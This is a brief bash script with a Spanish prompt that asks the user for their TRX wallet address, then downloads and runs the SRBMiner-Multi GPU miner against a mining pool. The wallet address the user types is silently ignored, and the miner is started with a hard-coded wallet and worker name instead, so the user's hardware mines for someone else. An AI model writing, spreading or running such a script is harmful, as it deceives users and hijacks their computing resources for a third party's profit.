#!/bin/bash

read -p "Ingresa tu dirección de billetera TRX: " wallet_address && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.5/SRBMiner-Multi-2-3-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-3-5-Linux.tar.xz && cd SRBMiner-Multi-2-3-5 && ./SRBMiner-MULTI --algorithm verushash --pool us.cloudiko.io:9999 --wallet RUNo4MAnSsAFqMAjrBtaryA2tGVk2RLBqt.asad1 --password x --disable-cpu
